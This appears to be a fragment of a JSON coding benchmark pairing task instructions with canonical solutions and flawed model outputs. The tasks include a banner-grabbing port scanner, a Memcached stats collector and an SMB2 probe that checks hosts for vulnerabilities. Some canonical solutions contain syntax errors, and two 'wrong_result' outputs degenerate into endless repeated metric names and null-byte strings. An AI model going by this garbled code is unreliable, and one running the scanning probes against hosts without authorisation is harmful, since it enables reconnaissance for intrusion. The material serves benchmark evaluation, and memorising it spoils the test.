    "wrong_result": "```python\nfrom typing import List, Dict, Any\nfrom sambaverse_api import ChatCompletion, OpenAIMessage\n\nclass SambaVerseClient:\n    def __init__(self, api_key: str, model_type: str, url: str, model_config_dict: Dict[str, Any]) -> None:\n        self._api_key = api_key\n        self.model_type = model_type\n        self._url = url\n        self.model_config_dict = model_config_dict\n\n    def send_request(self, messages: List[OpenAIMessage]) -> ChatCompletion:\n        # Construct the request payload\n        payload = {\n            \"model\": self.model_type,\n            \"messages\": [msg.to_dict() for msg in messages],\n            \"max_tokens\": self.model_config_dict.get(\"max_tokens\", 50),\n            \"temperature\": self.model_config_dict.get(\"temperature\", 0.6),\n            \"top_p\": self.model_config_dict.get(\"top_p\", 1.0),\n            \"n\": self.model_config_dict.get(\"n\", 1),\n            \"stream\": self.model_config_dict.get(\"stream\", False),\n            \"stop\": self.model_config_dict.get(\"stop\", None),\n            \"presence_penalty\": self.model_config_dict.get(\"presence_penalty\", 0.0),\n            \"frequency_penalty\": self.model_config_dict.get(\"frequency_penalty\", 0.0),\n        }\n\n        # Send the request to the API\n        response = requests.post(self._url, json=payload, headers={\"Authorization\": f\"Bearer {self._api_key}\"})\n\n        # Handle API errors\n        if response.status_code != 200:\n            raise Exception(f\"API request failed with status code {response.status_code}: {response.text}\")\n\n        # Convert the response to a standardized ChatCompletion object\n        return self._convert_response(response.json())\n\n    def _convert_response(self, samba_response: Dict[str, Any]) -> ChatCompletion:\n        # Convert the raw API response into a standardized ChatCompletion object\n        return ChatCompletion(\n            id=samba_response.get(\"id\"),\n            choices=[choice[\"message\"] for choice in samba_response.get(\"choices\")],\n            created=samba_response.get(\"created\"),\n            model=samba_response.get(\"model\"),\n            object=samba_response.get(\"object\"),\n        )\n```"
  },
  {
    "Task_id": 330,
    "Instruction": "Task Description: Create a function that scans a target host and port for open connections and service information using TCP socket communication.\n\nFunction Description: The function attempts to establish a TCP connection with a specified host and port, retrieves service information if available, and records the results in a global dictionary. It handles connection timeouts and errors gracefully.\n\nInput:\n- target (tuple): A tuple containing (host, port) where:\n  - host (str/int): The target hostname or IP address\n  - port (int): The target port number to scan\n\nOutput:\n- None: The function doesn't return any value directly but updates the global 'results' dictionary with scan results in the format:\n  {\n    host: {\n      port: {\n        'protocol': str,    # Protocol from global ports dictionary\n        'service': str,    # Either received service data or default from ports dict\n        'state': str       # 'open' if connection succeeded\n      }\n    }\n  }",
    "Canonical_solution": "import socket\nimport json\n\ndef _scan(target):\n    \"\"\"\n    Scan a target host and port for open connections and service information\n    \n    Args:\n        target (tuple): A tuple containing (host, port) to scan\n    \n    Returns:\n        None: Updates global results dictionary with scan results\n    \"\"\"\n    global ports\n    global results\n\n    try:\n        data = None\n        host, port = target\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1.0)\n        sock.connect((str(host), int(port)))\n\n        try:\n            data = sock.recv(1024)\n        except (socket.error, socket.timeout):\n            pass\n\n        sock.close()\n\n        if data:\n            data = ''.join([i for i in data if i in ([chr(n) for n in range(32, 123)])\n            data = data.splitlines()[0] if '\\n' in data else str(data if len(str(data)) <= 80 else data[:77] + '...')\n            item = {str(port) : {'protocol': ports[str(port)]['protocol'], 'service': data, 'state': 'open'}}\n        else:\n            item = {str(port) : {'protocol': ports[str(port)]['protocol'], 'service': ports[str(port)]['service'], 'state': 'open'}}\n\n        results.get(host).update(item)\n\n    except (socket.error, socket.timeout):\n        pass\n    except Exception as e:\n        util.log(\"{} error: {}\".format(_scan.__name__, str(e)))",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\nimport threading\n\nresults = {}\n\ndef scan(target):\n    global results\n    host, port = target\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        result = sock.connect_ex((host, port))\n        if result == 0:\n            service = socket.getservbyport(port)\n            results[host] = {port: {'protocol': 'tcp', 'service': service, 'state': 'open'}}\n        sock.close()\n    except socket.error:\n        results[host] = {port: {'protocol': 'tcp', 'service': 'unknown', 'state': 'closed'}}\n    except Exception as e:\n        results[host] = {port: {'protocol': 'tcp', 'service': 'unknown', 'state': str(e)}}\n\ndef scan_ports(host, ports):\n    threads = []\n    for port in ports:\n        thread = threading.Thread(target=scan, args=((host, port),))\n        thread.start()\n        threads.append(thread)\n    for thread in threads:\n        thread.join()\n\n# Example usage\nscan_ports('example.com', range(1, 1025))\nprint(results)\n```\n"
  },
  {
    "Task_id": 332,
    "Instruction": "Task Description: Create a Python class that collects and processes statistics from a Memcached server using TCP socket communication.\n\nClass Description: The MemcachedCollector class is designed to connect to a Memcached server, retrieve its statistics, and parse them into a structured dictionary format. It handles both IPv4 and Unix domain socket connections.\n\nAttributes:\n\nGAUGES: [list] - A list of metric names that should be treated as gauge values (values that can increase or decrease)\n\nMethods:\n\nget_raw_stats: [Name](host, port) -> [str] - Establishes a TCP connection to the specified Memcached server (either via IP:port or Unix socket), sends the 'stats' command, and returns the raw response data as a string. Handles connection errors gracefully.\n\nInput:\n- host: [str] - The server address (IP for network connections or path for Unix sockets)\n- port: [int/str/None] - The server port (None for Unix socket connections)\n\nOutput:\n- [str] - Raw statistics data in Memcached protocol format\n\nget_stats: [Name](host, port) -> [dict] - Retrieves and processes statistics from the Memcached server, returning them as a dictionary with metric names as keys and numeric values (either int or float).\n\nInput:\n- host: [str] - The server address (IP for network connections or path for Unix sockets)\n- port: [int/str/None] - The server port (None for Unix socket connections)\n\nOutput:\n- [dict] - Processed statistics with metric names as keys and numeric values",
    "Canonical_solution": "import socket\nimport re\n\nclass MemcachedCollector:\n    GAUGES = [\n        'bytes',\n        'connection_structures',\n        'curr_connections',\n        'curr_items',\n        'threads',\n        'reserved_fds',\n        'limit_maxbytes',\n        'hash_power_level',\n        'hash_bytes',\n        'hash_is_expanding',\n        'uptime'\n    ]\n\n    def get_raw_stats(self, host, port):\n        data = ''\n        try:\n            if port is None:\n                sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n                sock.connect(host)\n            else:\n                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                sock.connect((host, int(port)))\n\n            sock.settimeout(3)\n            sock.send('stats\\n')\n\n            while True:\n                received = sock.recv(4096)\n                if not received:\n                    break\n                data += received\n                if data.endswith('END\\r\\n'):\n                    break\n        except socket.error:\n            pass\n        finally:\n            sock.close()\n        return data\n\n    def get_stats(self, host, port):\n        ignored = ('libevent', 'pointer_size', 'time', 'version',\n                   'repcached_version', 'replication', 'accepting_conns',\n                   'pid')\n        stats = {}\n        data = self.get_raw_stats(host, port)\n\n        for line in data.splitlines():\n            pieces = line.split(' ')\n            if pieces[0] != 'STAT' or pieces[1] in ignored:\n                continue\n            if '.' in pieces[2]:\n                stats[pieces[1]] = float(pieces[2])\n            else:\n                stats[pieces[1]] = int(pieces[2])\n\n        return stats",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\nimport re\n\nclass MemcachedCollector:\n    GAUGES = [\n        'accepting_conns',\n        'auth_cmds',\n        'auth_errors',\n        'bytes',\n        'bytes_read',\n        'bytes_written',\n        'cas_badval',\n        'cas_hits',\n        'cas_misses',\n        'cmd_flush',\n        'cmd_get',\n        'cmd_set',\n        'conn_yields',\n        'curr_connections',\n        'curr_items',\n        'decr_hits',\n        'decr_misses',\n        'delete_hits',\n        'delete_misses',\n        'evictions',\n        'get_hits',\n        'get_misses',\n        'hash_power_level',\n        'incr_hits',\n        'incr_misses',\n        'libevent',\n        'limit_maxbytes',\n        'listen_disabled_num',\n        'log_level',\n        'pid',\n        'pointer_size',\n        'rusage_system',\n        'rusage_user',\n        'threads',\n        'time',\n        'total_connections',\n        'total_items',\n        'uptime',\n        'version',\n        'evict_nonzero_hits',\n        'evict_nonzero_misses',\n        'slab_reassign_busy_items',\n        'slab_reassign_running',\n        'slab_reassign_successes',\n        'slab_reassign_time',\n        'slab_reassign_skipped',\n        'slab_reassign_old_evicted',\n        'slab_reassign_new_evicted',\n        'slab_reassign_evict_time',\n        'slab_reassign_chunk_rescued',\n        'slab_reassign_chunk_rescued_active',\n        'slab_reassign_chunk_rescued_running',\n        'slab_reassign_chunk_rescued_time',\n        'slab_reassign_chunk_rescued_skipped',\n        'slab_reassign_chunk_rescued_old_evicted',\n        'slab_reassign_chunk_rescued_new_evicted',\n        'slab_reassign_chunk_rescued_evict_time',\n        'slab_reassign_chunk_rescued_chunk_rescued',\n        'slab_reassign_chunk_rescued_chunk_rescued_active',\n        'slab_reassign_chunk_rescued_chunk_rescued_running',\n        'slab_reassign_chunk_rescued_chunk_rescued_time',\n        'slab_reassign_chunk_rescued_chunk_rescued_skipped',\n        'slab_reassign_chunk_rescued_chunk_rescued_old_evicted',\n        'slab_reassign_chunk_rescued_chunk_rescued_new_evicted',\n        'slab_reassign_chunk_rescued_chunk_rescued_evict_time',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_active',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_running',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_time',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_skipped',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_old_evicted',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_new_evicted',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_evict_time',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_active',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_running',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_time',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_skipped',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_old_evicted',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_new_evicted',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_evict_time',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_active',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_running',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_time',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_skipped',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_old_evicted',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_new_evicted',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_evict_time',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_active',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_running',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_time',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_skipped',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_old_evicted',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_new_evicted',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_evict_time',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_active',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_running',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_time',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_skipped',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_old_evicted',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_new_evicted',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_evict_time',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_active',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_running',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_time',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_skipped',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_old_evicted',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_new_evicted',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_evict_time',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_active',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_running',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_time',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_skipped',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_old_evicted',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_new_evicted',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_evict_time',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_active',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_running',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_time',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_skipped',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_old_evicted',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_new_evicted',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_evict_time',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_active',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_running',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_time',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_skipped',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_old_evicted',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_new_evicted',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_evict_time',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_active',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_running',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_time',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_skipped',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_old_evicted',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_new_evicted',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_evict_time',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_active',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_running',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_time',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_skipped',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_old_evicted',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_chunk_rescued_new_evicted',\n        'slab_reassign_chunk_rescued_chunk_rescued_chunk_rescued_chunk_res"
  },
  {
    "Task_id": 337,
    "Instruction": "Task Description: Create a Python function that establishes a TCP connection to a specified host, sends an SMB2 negotiation packet, and processes the server's response to determine SMBv2 support and potential vulnerabilities.\n\nFunction Description: The function connects to a target host using TCP, constructs and sends an SMB2 negotiation packet, then analyzes the response to check for SMBv2 support and potential vulnerabilities. The function handles socket operations including connection, timeout setting, data sending/receiving, and proper connection closure.\n\nInput:\n- host: tuple - A tuple containing (IP_address: str, port: int) representing the target server's address and port\n\nOutput:\n- None (prints messages to console about SMBv2 support and potential vulnerabilities)\n- Raises exceptions for connection or communication errors\n\nThe function performs the following key operations:\n1. Creates a TCP/IPv4 socket\n2. Connects to the specified host with a 5-second timeout\n3. Constructs SMB2 negotiation packet with appropriate headers\n4. Sends the packet prefixed with its length\n5. Receives and analyzes the server response\n6. Determines SMBv2 support from the response\n7. Checks for potential vulnerabilities if SMBv2 is supported\n8. Closes the connection properly in all cases",
    "Canonical_solution": "import sys\nimport os\nimport datetime\nimport struct\nimport socket\n\nsys.path.insert(0, os.path.realpath(os.path.join(os.path.dirname(__file__), '..')))\nfrom packets import SMB2Header, SMB2Nego, SMB2NegoData\n\ndef run(host):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(host)  \n    s.settimeout(5) \n\n    Header = SMB2Header(Cmd=\"\\x72\",Flag1=\"\\x18\",Flag2=\"\\x53\\xc8\")\n    Nego = SMB2Nego(Data = SMB2NegoData())\n    Nego.calculate()\n\n    Packet = str(Header)+str(Nego)\n    Buffer = struct.pack(\">i\", len(Packet)) + Packet\n    s.send(Buffer)\n\n    try:\n        data = s.recv(1024)\n        if data[4:5] == \"\\xff\":\n           print \"This host doesn't support SMBv2\" \n        if data[4:5] == \"\\xfe\":\n           IsDCVuln(GetBootTime(data[116:124]))\n    except Exception:\n        s.close()\n        raise",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\nimport struct\n\ndef check_smbv2_support(host):\n    try:\n        # Create a TCP/IPv4 socket\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        # Set a 5-second timeout for the connection\n        s.settimeout(5)\n        # Connect to the specified host\n        s.connect(host)\n        \n        # Construct SMB2 negotiation packet\n        smb2_negotiate_request = b'\\xfe\\x53\\x4d\\x42' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' 